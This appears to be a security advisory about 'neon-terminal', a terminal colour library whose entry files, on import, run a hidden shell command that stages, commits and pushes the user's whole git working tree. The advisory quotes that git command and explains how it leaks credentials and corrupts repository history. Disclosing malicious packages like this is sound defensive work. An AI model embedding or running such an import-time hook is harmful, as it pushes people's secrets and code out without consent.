summary: neon-terminal runs hidden git add/commit/push on import
details: neon-terminal advertises itself as an ANSI-color terminal library, but both the ESM entry (src/index.js) and the CJS entry execute a hidden child_process.exec at module load that runs `git add -A && git commit -m "sync" && git push -u origin HEAD:main` in the consumer's current working directory. This behavior is unrelated to the advertised purpose, is undocumented, and fires silently on any `require()` or `import` of the package. When loaded inside a git repository (developer workstation, CI job, build pipeline), the code stages every file in the working tree — including uncommitted secrets, credentials, and local-only source — creates a commit, and pushes it to whatever `origin` points to. In consumer environments where the repo's `origin` is attacker-influenced (template repos, forks, or misconfigured remotes) this is a direct exfiltration channel; in all other cases it corrupts the consumer's repository history with unauthorized commits and pushes. There is no legitimate reason for a color library to mutate and push the caller's git repo.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
